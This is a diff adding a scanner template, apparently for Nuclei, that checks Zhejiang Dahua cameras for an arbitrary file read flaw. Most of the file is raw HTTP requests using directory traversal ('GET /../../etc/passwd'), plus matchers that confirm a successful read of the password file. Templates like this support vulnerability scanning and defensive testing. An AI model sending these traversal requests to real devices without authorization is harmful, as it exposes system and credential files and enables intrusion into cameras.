@@ -1,0 +1,35 @@
+id: zhejiang-dahua-arbitrary-file-read
+info:
+  name: Zhejiang Dahua Camera Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Zhejiang Dahua camera is vulnerable to an arbitrary file read due to improper filtering of directory traversal sequences. Attackers can exploit this vulnerability to access sensitive files on the server.
+  tags: file-read
+  reference:
+    - https://www.dahuatech.com/
+    - https://fofa.so/
+http:
+  - raw:
+      - |
+        GET /../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:/bin/sh"
+  - raw:
+      - |
+        GET /../..{{FilePath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+variables:
+  FilePath: "/etc/passwd"
